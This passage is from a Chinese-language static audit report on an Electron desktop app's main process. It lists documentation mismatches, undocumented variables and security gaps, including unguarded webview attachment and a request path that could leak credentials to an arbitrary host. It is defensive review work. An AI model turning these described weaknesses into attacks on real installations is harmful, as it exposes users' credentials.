cd /home/user/hermes-agent && grep -rn "unsupported-platform" apps/desktop/electron/*.ts | grep -v "\.test\.ts:" ; \
  grep -n "broadcastBootstrapEvent(" apps/desktop/electron/main.ts ; \
  grep -c "unsupported" apps/desktop/electron/bootstrap-runner.ts
```

所以这是一条**主进程再也发不出来的渲染层状态**。渲染层那边有对应的 UI 分支
(`apps/desktop/src/components/desktop-install-overlay.tsx:254`)和类型定义
(`apps/desktop/src/global.d.ts:751`)——但渲染层在本片之外,我只做了 grep,**没有读那两个文件**,
所以"渲染层为一个永不到达的事件保留了 UI"这句话按 grep 级证据算,不按精读算。

### ■-5 `webviewTag: true` 但主进程没有 `will-attach-webview` 守卫

聊天窗口的 `webPreferences` 里 `webviewTag: true`(见 §5.6 的代码块),意味着渲染页面可以插
`<webview>` 标签加载外部内容。Electron 的建议做法是在主进程监听 `will-attach-webview`,
把访客页面自带的 `preload` / `nodeIntegration` 等 `webPreferences` 剥掉,因为那些属性
**是宿主页面的 HTML 属性说了算的**。

**搜索面**:在 `apps/desktop/electron/*.ts`(排除 `*.test.ts`)里 grep
`will-attach-webview|did-attach-webview|webviewTag`,**只有一处命中**:
`session-windows.ts:44` 的 `webviewTag: true` 本身。没有任何 attach 守卫。

```verify
cd /home/user/hermes-agent && grep -rn "will-attach-webview\|did-attach-webview\|webviewTag" apps/desktop/electron/*.ts | grep -v "\.test\.ts:"
```

同样要诚实标注严重性:宿主页面是第一方的,`will-navigate` 也把它钉在 `file:`/dev server 上;
所以这条和 ■-1 一样,是"渲染层被攻破之后"这一层的纵深防御缺口,不是可直接利用的洞。
`embed-referer.ts` 说明确实有 webview 在用(`persist:hermes-embed` 分区)。

### ▲-1 两份文档都说"删掉 `.hermes-bootstrap-complete` 可以强制干净的首启",代码明确不这么做

`apps/desktop/README.md:176` 的 `### Troubleshooting` 节、`**macOS / Linux:**` 小节下:

> \# Force a clean first-launch setup
> rm "$HOME/.hermes/hermes-agent/.hermes-bootstrap-complete"

`website/docs/user-guide/desktop.md:301` 的 `## Troubleshooting` 节,"Common resets" 代码块里
第 312-313 行是同一条命令、同一句说明。README 的 Windows 版(`:194-195`)也是同一条。

代码里,marker 缺失被**显式忽略**——只要运行时可用就直接用它,连日志都写好了:

`apps/desktop/electron/main.ts:3909-3919 @ 863e313`

```ts
  const activeRuntime = activeRuntimeState()

  if (activeRuntime.shouldUseActiveRuntime && !bootstrapRepairRequested) {
    if (!activeRuntime.hasValidMarker) {
      rememberLog(
        `[bootstrap] Active Hermes runtime at ${ACTIVE_HERMES_ROOT} is usable but the bootstrap marker is missing or stale; skipping first-run bootstrap.`
      )
    }

    return createActiveBackend(backendArgs)
  }
```


判定这条时按规矩把整段一起看:同一个代码块里的第二条命令
(`rm -rf "$HOME/.hermes/hermes-agent/venv"`,说明是 "Rebuild a broken Python venv")
**是成立的**,而且恰恰是它才真能触发首启——因为 `isActiveRuntimeUsable()` 要求 venv 里的
python 存在**且能 import**,删掉 venv 才会让 `shouldUseActiveRuntime` 变 false。
所以这一段文档是"第一条命令的说明失效、第二条正确",不是整段过时。

`active-runtime-state.ts:31-37` 的注释把这个设计意图写得很清楚:marker 只是"这个安装是
桌面装的"这一条出身信息,不是"能不能跑"的判据。也就是说**代码是有意这么改的,文档没跟上**。

### ▲-2 `website/docs/user-guide/desktop.md` 把 `HERMES_DESKTOP_HERMES` 的优先级说反了

`## How it works` 节(`website/docs/user-guide/desktop.md:206`)那一段说:

> Backend resolution first honours `HERMES_DESKTOP_HERMES_ROOT`, then a completed managed
> install, then a probed `hermes` on `PATH` (unless `--ignore-existing` /
> `HERMES_DESKTOP_IGNORE_EXISTING=1` is set), and finally an explicit `HERMES_DESKTOP_HERMES`
> command override for packagers such as Nix.

"and finally" 断言 `HERMES_DESKTOP_HERMES` 是**最低**优先级。代码里它在第 4 级内部**先于**
PATH 查找:`hermesOverride` 有值就用它、`else` 才 `findOnPath('hermes')`
(`apps/desktop/electron/main.ts:3934-3945`)。而且它下面还有第 5 级(系统 Python + 已装
`hermes_cli`)和第 6 级(bootstrap),所以它既不是"最后",也不在 PATH **之后**。

同仓的 `apps/desktop/README.md:105-113` 把这一级写成 "`HERMES_DESKTOP_HERMES`, or `hermes` on
`PATH`"(同一级)并且补上了系统 Python 那一级 —— **README 是对的,website 文档是错的**,
两份自绘地图彼此也不一致。

### ▲-3 `apps/desktop/README.md:114` 的"候选一律先探针"有一个代码里明写的例外

> Candidates are probed before use; an existing shim or interpreter is not enough.

这句话紧跟在它自己列出的六级梯子后面,所以管的是那六级全部。但第 4 级的 `HERMES_DESKTOP_HERMES`
**明确跳过探针**:

`apps/desktop/electron/backend-probes.ts:189-191 @ 863e313`

```ts
function shouldTrustHermesOverride(hermesOverride?: string) {
  return typeof hermesOverride === 'string' && hermesOverride.trim().length > 0
}
```

调用点是 `main.ts:3975` 的 `if (shouldTrustHermesOverride(hermesOverride) || verifyHermesCli(...))`
——短路或,覆盖存在时 `verifyHermesCli` 根本不执行。代码注释给了理由(Nix wrapper 指向的是
不可变的、版本匹配的包,不该因为探针在负载下超时就掉进可变的 bootstrap 路径),
所以这是**有意的例外**;但 README 那句话是全称,字面为假,记 ▲。

### ◇-1 主进程读的 28 个 `HERMES_*` 环境变量里,17 个在环境变量参考文档里查不到

```verify
cd /home/user/hermes-agent && for f in $(ls apps/desktop/electron/*.ts | grep -v '\.test\.ts$'); do \
  grep -ohE "(env\.|env\?\.|process\.env\.)(HERMES_[A-Z0-9_]+)|env\[['\"](HERMES_[A-Z0-9_]+)['\"]\]" "$f"; \
done | grep -oE "HERMES_[A-Z0-9_]+" | sort -u | while read -r v; do \
  grep -q "$v" website/docs/reference/environment-variables.md || echo "UNDOCUMENTED: $v"; done
```

未收录的 17 个:`HERMES_DESKTOP_APP_NAME`、`BOOT_FAKE`、`BOOT_FAKE_ERROR`、`BOOT_FAKE_STEP_MS`、
`CHILD_PID`、`DISABLE_GPU`、`IS_PACKAGED`、`POOL_IDLE_MS`、`POOL_MAX`、
`PORT_ANNOUNCE_TIMEOUT_MS`、`REMOTE_TOKEN`、`SHELL`、`SKIP_QUIT_CONFIRM`、`TERMINAL`、
`USER_DATA_DIR`、`WEB_DIST`,以及 `HERMES_PROBE_TIMEOUT_MS`。

其中三个不是内部测试钩子而是**面向用户的**:

- `HERMES_DESKTOP_REMOTE_TOKEN` —— `hardening.ts:68-69` 的错误文案**直接叫用户去设它**
  ("Set HERMES_DESKTOP_REMOTE_URL and HERMES_DESKTOP_REMOTE_TOKEN in your environment"),
  而配套的 `HERMES_DESKTOP_REMOTE_URL` 在文档 `:556` 行有条目、`_TOKEN` 没有;
- `HERMES_DESKTOP_PORT_ANNOUNCE_TIMEOUT_MS` —— `backend-ready.ts:22-25` 的注释写明是
  "for users on slow disks / aggressive AV";
- `HERMES_PROBE_TIMEOUT_MS` —— 同类的冷启动救急旋钮。

### ◇-2 吉祥物悬浮窗与唤醒指示器两类窗口在任何文档里都没有

```verify
cd /home/user/hermes-agent && for t in "pet overlay" "petOverlay" "wake indicator" "wake-indicator" "backend pool" "POOL_MAX"; do \
  printf "%-18s : " "$t"; grep -rli "$t" apps/desktop/README.md apps/desktop/AGENTS.md apps/desktop/DESIGN.md website/docs/ 2>/dev/null | tr '\n' ' '; echo; done
```

搜索面是 `apps/desktop/README.md`、`apps/desktop/AGENTS.md`、`apps/desktop/DESIGN.md`、
`website/docs/` 全树,六个词全部零命中。同批零命中的还有**多 profile 后端池**
(最多 3 个额外的 `hermes serve` 子进程、LRU + 空闲回收 + 保鲜窗口),
而 `website/docs/user-guide/desktop.md:95` 的 "Windows, tabs & panes" 一节只讲了标签页与多窗口。
Quick Entry 有文档(`desktop.md:122`),另外两类窗口没有。

### ◇-3 两份 macOS entitlements plist 逐字节相同

```verify
cd /home/user/hermes-agent && cmp apps/desktop/electron/entitlements.mac.plist apps/desktop/electron/entitlements.mac.inherit.plist && echo IDENTICAL
```

`apps/desktop/package.json:209-210` 分别把它们配给 `entitlements`(主应用)和
`entitlementsInherit`(helper 子进程)。两者内容完全一致,意味着 helper 进程也拿到了
`device.audio-input` 与 `device.camera`。两份都**没有**声明 `com.apple.security.app-sandbox`,
所以也就用不到 `com.apple.security.inherit`——在没开 App Sandbox 的前提下这不构成缺陷,
但"两个名字、一份内容"这件事在代码里没有任何地方交代过,读的人会以为它们有区别。

### ◎-1 Quick Entry 的快捷键约束比文档说的更严

`website/docs/user-guide/desktop.md:122` 的 `### Quick Entry` 节说:

> the default shortcut is **Ctrl/Cmd+Shift+Space** and you can set your own (it needs at
> least one modifier)

"至少一个修饰键"字面成立(`parseQuickEntryShortcut` 确实在 `modifiers.length === 0` 时返回
`no-modifier`),但代码还多两条文档没提的约束:主键不能是 `Escape`,以及不能有两个非修饰键。

`apps/desktop/electron/quick-entry.ts:189-195 @ 863e313`

```ts
  if (modifiers.length === 0) {
    return { ok: false, reason: 'no-modifier' }
  }

  if (key === 'escape') {
    return { ok: false, reason: 'reserved' }
  }
```


`Escape` 被保留的理由写在函数注释里:窗口内 Escape 是"收起",绑成全局就再也切不回来了。
文档为真但保守,记 ◎ 不记 ▲。


## §7 未取证与推定(明确列出我没验的东西)

1. **本片的 490 个桌面测试一个都没跑。** `apps/desktop` 的 vitest/playwright 套件需要
   Electron 运行时,本容器装不动,派工书也禁止 `npm install` / `vitest`。
   **所以本文全部结论都建立在静态阅读上,没有任何一条经过运行时验证。**
   唯一一次真实执行是 §6 ■-1 里那条 `node -e`,它验证的只是 Node 的 URL 解析行为,
   不是 hermes-agent 的运行时行为。测试文件我读了文件名与部分用例名当行为规格参照,
   但没有声称跑过。
2. **渲染层 `apps/desktop/src/`(816 个文件)按派工书明确不读。** 凡本文提到渲染层的地方
   (■-4 的 UI 分支、§4 跳 0、"渲染层每 60s touch 一次"),证据强度只有 grep 级或代码注释级,
   不是精读级。
3. **`main.ts` 的实现体大量没有逐行读。** L2 的口径是"读接口面不读实现体"。我逐个读了
   126 个 IPC 处理器的注册行与其中约 40 个的完整实现,以及后端生命周期、窗口创建、
   bootstrap、更新四条主线;`applyUpdatesPosixInApp`(约 290 行)、`checkUpdates`(约 115 行)、
   `openOauthLoginWindow`(约 135 行)、`buildApplicationMenu`(约 120 行)、
   `installContextMenu`(约 120 行)、`bootstrapSshConnectionInner`(约 120 行)
   这几段只读了头尾与注释。
4. **`bootstrap-runner.ts`(1037)、`ssh-connection.ts`(921)、`remote-lifecycle.ts`(907)、
   `git-review-ops.ts`(725)只读了模块头与导出面**,没读实现。
5. **■-3 的"没有上限"是静态结论。** 我没有构造一个"ready 之后反复崩溃"的后端去观察实际重启
   频率;真实频率由渲染层的重连退避决定,而渲染层不在本片。
6. **■-1 / ■-5 的严重性判断带前提。** 两条都依赖"渲染进程可能被攻破"这个前提。我没有验证
   渲染层是否真的会渲染不可信 HTML,那需要读 `apps/desktop/src/`。
7. **plist 的实际签名效果没验。** 我读的是文件内容与 `package.json` 的引用关系,
   没有跑 `codesign`/`electron-builder`。
8. **Python 侧只读了对照所需的部分。** `tui_gateway/host_supervisor.py` 读了全部 577 行的结构
   与关键实现;`tui_gateway/compute_host.py`(880 行)只读了心跳循环与 hello 帧两处。
   `hermes_cli/web_server.py` 只读了 READY 公告与 ready 文件写入两段(该文件 17,000+ 行)。
9. **没有跑过 `verify_ledger.py`,也没有改台账**(那是主线的事)。


## §8 L2 判据自评

| 判据 | 自评 | 说明 |
|---|---|---|
| 1. 点名到位:每个文件全路径 + 一句话角色 | **达成 80/80** | §2 分 11 组,组内逐个列出全路径与角色。可机械核对:`grep -c 'apps/desktop/electron/' notes/r10-raw-desktop-electron.md` 覆盖全部 80 条清单路径。 |
| 2. 接缝穷举:逐项列全 + 机械枚举命令 + 条数 | **达成** | 8 个接缝全部列全:126 条渲染→主 IPC(§3.1 逐条 126 行表)、23 条主→渲染(§3.2 逐条)、2 个动态通道族(§3.3)、152 个 preload 叶函数(§3.4,给了枚举脚本;正文没有逐条列 152 行,而是给了分类 + 可复现的枚举命令 + 13 个命名空间的逐个计数——**这一项是"给了可复现枚举命令"而不是"正文逐行抄了 152 行"**)、8 个 bootstrap 事件(§3.5 逐条)、12 个 boot phase(§3.6 逐条)、28 个环境变量(§3.7 逐条)、15 个 userData 条目(§3.8 逐条)。每个接缝都有 ```verify 枚举命令与条数。 |
| 3. 一条端到端链走通,逐跳带锚点 | **达成** | §4,10 跳,从 preload 到 FastAPI 路由再回来。跨出本片的两端(渲染层入口、Python 路由)都点名了接到谁并给了 Python 侧锚点。 |
| 4. 两处以上逐字取证 | **达成,远超** | 全文 22 个逐字源码围栏块,分布在 main.ts / preload.ts / backend-ready.ts / backend-child.ts / backend-command.ts / backend-probes.ts / backend-start-failure.ts / bootstrap-repair-guard.ts / dashboard-token.ts / hardening.ts / quick-entry.ts / remote-liveness.ts / session-windows.ts,以及 Python 侧 host_supervisor.py / web_server.py / web_routers/sessions.py。 |
| 5. 至少一条记号 | **达成** | 5 条 ■、3 条 ▲、3 条 ◇、1 条 ◎,共 12 条,逐条带锚点与(负结论的)搜索面。 |

**没做到的部分,如实写:**

- 判据 2 里 preload 的 152 个叶函数**没有在正文逐行列出**,只给了分类计数 + 枚举脚本。
  理由是这 152 条与 §3.1 的 126 条 IPC 是一一对应的(表里已有 `preload API` 列),
  再抄一遍 152 行是冗余;剩下 26 条(23 个订阅器 + 3 个特殊项)在 §3.2 与 §3.4 已逐条交代。
  如果判据要求字面意义上的"152 行表",这一项算 **部分达成**。
- 判据 1 的"一句话角色"对 4 个大文件(bootstrap-runner / ssh-connection / remote-lifecycle /
  git-review-ops)是**基于模块头注释与导出面**写的,不是基于通读实现。


## §9 移交

每条带「锚点 + 紧跟的反引号摘录 + 一句话现象」。

| 编号 | 锚点与摘录 | 现象 | 建议下一轮 |
|---|---|---|---|
| H-R10H-a | `apps/desktop/electron/main.ts:10274`:`const url = ` | `hermes:api` 用模板串把渲染层给的 `request.path` 直接拼在 baseUrl 后,`path` 以 `@host` 开头即可把带凭据的请求发到任意主机 | R10B 读渲染层时确认调用侧是否有约束;若无,这是一条应上报的安全项 |
| H-R10H-b | `apps/desktop/electron/main.ts:11204`:`ipcMain.handle('hermes:fs:trash', async (_event, targetPath) => {` | 与 `fs:reveal`/`fs:openDir`/`fs:rename` 一样,渲染层给的路径不过 `hardening.ts` 的守卫,而同组其余 6 条通道都过 | 判断这 4 条是"故意豁免"还是"加固时漏掉的" |
| H-R10H-c | `apps/desktop/electron/main.ts:11176`:`// this never creates directory trees or escapes the allowed roots, and content` | 注释宣称有 "allowed roots" 约束,`hardening.ts` 里没有任何根白名单实现 | 若确认无根白名单,该注释应改;它会让下一个读者以为路径已被围栏 |
| H-R10H-d | `apps/desktop/electron/main.ts:1548`:`} else if (ev.type === 'unsupported-platform') {` | 这个 bootstrap 事件分支在 `apps/desktop/electron/` 内没有任何发送者;渲染层却有对应 UI 与类型 | R10B 读 `apps/desktop/src/components/desktop-install-overlay.tsx` 时确认这条 UI 是否已成死路 |
| H-R10H-e | `apps/desktop/electron/session-windows.ts:44`:`webviewTag: true,` | 开了 `<webview>` 但主进程无 `will-attach-webview` 守卫 | R10B 确认渲染层用 webview 加载什么、`persist:hermes-embed` 分区之外还有没有别的用法 |
| H-R10H-f | `apps/desktop/electron/main.ts:8598`:`backendReady = true` | 这一行之后的子进程崩溃不进任何计数器,`startHermes()` 会被下一次 IPC 无限次重新触发 | 与 `tui_gateway/host_supervisor.py:507` 的 `_maybe_respawn_after_crash` 一起,作为"双实现分岔"的案例写进成品章 |
| H-R10H-g | `apps/desktop/electron/main.ts:3912`:`if (!activeRuntime.hasValidMarker) {` | 代码明确忽略缺失的 bootstrap marker,而 `apps/desktop/README.md:184` 与 `website/docs/user-guide/desktop.md:313` 都教用户删这个 marker 来"强制干净首启" | 两份文档同一处过时,值得作为"自绘地图腐烂"的跨轮样本计入 ▲ |
| H-R10H-h | `apps/desktop/electron/backend-probes.ts:190`:`return typeof hermesOverride === 'string' && hermesOverride.trim().length > 0` | `HERMES_DESKTOP_HERMES` 跳过 `--version` 探针,与 `apps/desktop/README.md:114` 的"候选一律先探针"冲突(代码是有意的) | 若要修,改文档而不是改代码 |
| H-R10H-i | `apps/desktop/electron/main.ts:1064`:`const backendPool = new Map() // profile -> { process, port, token, connectionPromise, lastActiveAt }` | 多 profile 后端池(≤3 个额外 Python 子进程)在任何文档里零命中 | 成品章值得单开一小节:它是"一个桌面应用同时监管四个 Python 后端"这件事 |
| H-R10H-j | `apps/desktop/electron/preload.ts:126`:`return webUtils.getPathForFile(file) || ''` | 152 个暴露项里唯一一个不经过主进程、直接在 preload 里调 Electron API 的 | 若 R10B 要统计"渲染层能力面",这一条不在 IPC 表里,容易漏 |

